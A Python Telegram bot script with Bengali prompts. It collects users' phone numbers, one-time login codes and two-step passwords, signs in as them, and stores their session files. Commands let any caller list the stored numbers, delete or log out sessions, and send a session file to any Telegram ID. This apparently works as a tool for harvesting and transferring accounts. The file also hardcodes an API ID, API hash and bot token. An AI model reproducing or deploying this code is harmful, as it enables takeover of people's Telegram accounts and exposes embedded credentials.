import asyncio
import os
from telethon import TelegramClient, events

# --- আপনার Credentials ---
API_ID = 26288557  
API_HASH = 'f2c5cc7974b87a2ee5ee229b88dd20e5'  
BOT_TOKEN ='8770799697:AAGFv7Kk-amCAeIvCPnCsoXgDEdq3q04udE'

bot = TelegramClient('bot_session', API_ID, API_HASH)

user_states = {}

def get_sessions():
    """সব সেভ হওয়া সেশন ফাইল বের করার ফাংশন"""
    return [f for f in os.listdir('.') if f.endswith('.session') and f != 'bot_session.session']

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    first_name = event.sender.first_name if event.sender else "User"
    msg = (
        f"👋 **হ্যালো {first_name}!**\n\n"
        "📊 /store : সামারি\n"
        "📊 /my_numbers : কান্ট্রি লিস্ট\n"
        "➕ /add_number : নম্বর যোগ করুন\n"
        "⚡ /terminate `[phone]` : সেশন ক্লিয়ার\n"
        "📤 /send `[phone]` `[ID]` : ট্রান্সফার\n"
        "🚪 /logout `[phone]` : লগআউট\n"
        "❌ /cancel : বাতিল"
    )
    await event.respond(msg)

@bot.on(events.NewMessage(pattern='/store'))
async def store_summary(event):
    sessions = get_sessions()
    await event.respond(f"📱 **আপনার বর্তমানে সংরক্ষিত সেশন সংখ্যা:** {len(sessions)}")

@bot.on(events.NewMessage(pattern='/my_numbers'))
async def my_numbers(event):
    sessions = get_sessions()
    if not sessions:
        await event.respond("📁 **কোনো সংরক্ষিত সেশন পাওয়া যায়নি!**")
        return
    
    text = "📋 **সংরক্ষিত সেশন তালিকা:**\n\n"
    for s in sessions:
        phone = s.replace('session_', '').replace('.session', '')
        text += f"• `+{phone}`\n"
    await event.respond(text)

@bot.on(events.NewMessage(pattern=r'/terminate(?:\s+(.+))?'))
async def terminate_session(event):
    phone_input = event.pattern_match.group(1)
    if not phone_input:
        await event.respond("⚠️ **ব্যবহারের নিয়ম:** `/terminate +8801700000000` (নম্বরসহ টাইপ করুন)")
        return
    
    clean_phone = phone_input.strip().replace('+', '').replace(' ', '')
    filename = f"session_{clean_phone}.session"
    
    if os.path.exists(filename):
        os.remove(filename)
        await event.respond(f"🗑️ **+{clean_phone}** নম্বরের সেশন ফাইলটি সফলভাবে ডিলিট করা হয়েছে।")
    else:
        await event.respond(f"❌ **+{clean_phone}** নম্বরের কোনো সেশন ফাইল পাওয়া যায়নি।")

@bot.on(events.NewMessage(pattern=r'/logout(?:\s+(.+))?'))
async def logout_session(event):
    phone_input = event.pattern_match.group(1)
    if not phone_input:
        await event.respond("⚠️ **ব্যবহারের নিয়ম:** `/logout +8801700000000` (নম্বরসহ টাইপ করুন)")
        return
    
    clean_phone = phone_input.strip().replace('+', '').replace(' ', '')
    filename = f"session_{clean_phone}.session"
    
    if os.path.exists(filename):
        try:
            temp_client = TelegramClient(f"session_{clean_phone}", API_ID, API_HASH)
            await temp_client.connect()
            if await temp_client.is_user_authorized():
                await temp_client.log_out()
                await event.respond(f"🚪 **+{clean_phone}** অ্যাকাউন্টটি সফলভাবে টেলিগ্রাম থেকে লগআউট করা হয়েছে।")
            else:
                await event.respond("⚠️ অ্যাকাউন্টটি আগেই লগআউট অবস্থায় ছিল।")
        except Exception as e:
            await event.respond(f"❌ লগআউট করতে সমস্যা হয়েছে: {str(e)}")
        finally:
            if os.path.exists(filename):
                os.remove(filename)
    else:
        await event.respond(f"❌ **+{clean_phone}** নম্বরের কোনো সেশন ফাইল পাওয়া যায়নি।")

@bot.on(events.NewMessage(pattern=r'/send(?:\s+(\+\d+|\d+))?(?:\s+(\d+))?'))
async def send_session(event):
    args = event.text.split()
    if len(args) < 3:
        await event.respond("⚠️ **ব্যবহারের নিয়ম:** `/send +8801700000000 123456789`\n(নম্বর এবং যার কাছে পাঠাবেন তার Telegram ID দিন)")
        return
    
    phone = args[1].replace('+', '').replace(' ', '')
    target_id = int(args[2])
    filename = f"session_{phone}.session"
    
    if os.path.exists(filename):
        try:
            await bot.send_file(target_id, filename, caption=f"📦 **Session File for +{phone}**")
            await event.respond(f"📤 **+{phone}** এর সেশন ফাইলটি সফলভাবে `{target_id}` আইডি-তে পাঠানো হয়েছে!")
        except Exception as e:
            await event.respond(f"❌ ফাইল পাঠাতে ব্যর্থ হয়েছে: {str(e)}")
    else:
        await event.respond(f"❌ **+{phone}** এর কোনো সেশন ফাইল খুঁজে পাওয়া যায়নি।")

@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel(event):
    user_id = event.sender_id
    if user_id in user_states:
        client = user_states[user_id].get('client')
        if client:
            await client.disconnect()
        del user_states[user_id]
    await event.respond("❌ **চলতি প্রসেস বাতিল করা হয়েছে।**")

@bot.on(events.NewMessage(pattern='/add_number'))
async def add_number(event):
    user_id = event.sender_id
    user_states[user_id] = {'step': 'AWAITING_PHONE'}
    await event.respond("📱 **অনুগ্রহ করে কান্ট্রি কোডসহ আপনার টেলিগ্রাম নম্বরটি পাঠান।**\n(যেমন: `+8801700000000`)")

@bot.on(events.NewMessage)
async def handle_user_input(event):
    user_id = event.sender_id
    text = event.text.strip()

    if user_id not in user_states or text.startswith('/'):
        return

    state = user_states[user_id]

    # OTP পাঠানো
    if state['step'] == 'AWAITING_PHONE':
        phone = text.replace(' ', '')
        await event.respond(f"⏳ **{phone}** নম্বরে কোড পাঠানো হচ্ছে, একটু অপেক্ষা করুন...")
        
        session_name = f"session_{phone.replace('+', '')}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        try:
            await client.connect()
            send_code = await client.send_code_request(phone)
            
            user_states[user_id] = {
                'step': 'AWAITING_CODE',
                'phone': phone,
                'phone_code_hash': send_code.phone_code_hash,
                'client': client
            }
            await event.respond("🔑 **আপনার টেলিগ্রামে পাওয়া OTP কোডটি পাঠান:**\n(যেমন: `12345`)")
        except Exception as e:
            await event.respond(f"❌ **এরর হয়েছে:** {str(e)}")
            await client.disconnect()
            del user_states[user_id]

    # OTP যাচাই
    elif state['step'] == 'AWAITING_CODE':
        code = text.strip()
        client = state['client']
        phone = state['phone']
        
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=state['phone_code_hash'])
            await event.respond(f"✅ **সফলভাবে {phone} নম্বরের সেশন সেভ করা হয়েছে!**")
            await client.disconnect()
            del user_states[user_id]
        except Exception as e:
            err_msg = str(e)
            if "Two-steps verification" in err_msg or "2FA" in err_msg or "password" in err_msg.lower():
                user_states[user_id]['step'] = 'AWAITING_PASSWORD'
                await event.respond("🔐 **আপনার একাউন্টে 2FA (Password) দেওয়া আছে। পাসওয়ার্ডটি টাইপ করে পাঠান:**")
            else:
                await event.respond(f"❌ **ভুল কোড অথবা এরর:** {err_msg}")

    # 2FA পাসওয়ার্ড যাচাই
    elif state['step'] == 'AWAITING_PASSWORD':
        password = text
        client = state['client']
        phone = state['phone']
        
        try:
            await client.sign_in(password=password)
            await event.respond(f"✅ **সফলভাবে {phone} নম্বরের সেশন সেভ করা হয়েছে!**")
            await client.disconnect()
            del user_states[user_id]
        except Exception as e:
            await event.respond(f"❌ **ভুল পাসওয়ার্ড:** {str(e)}")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("🤖 Bot started successfully! Press Ctrl+C to stop.")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
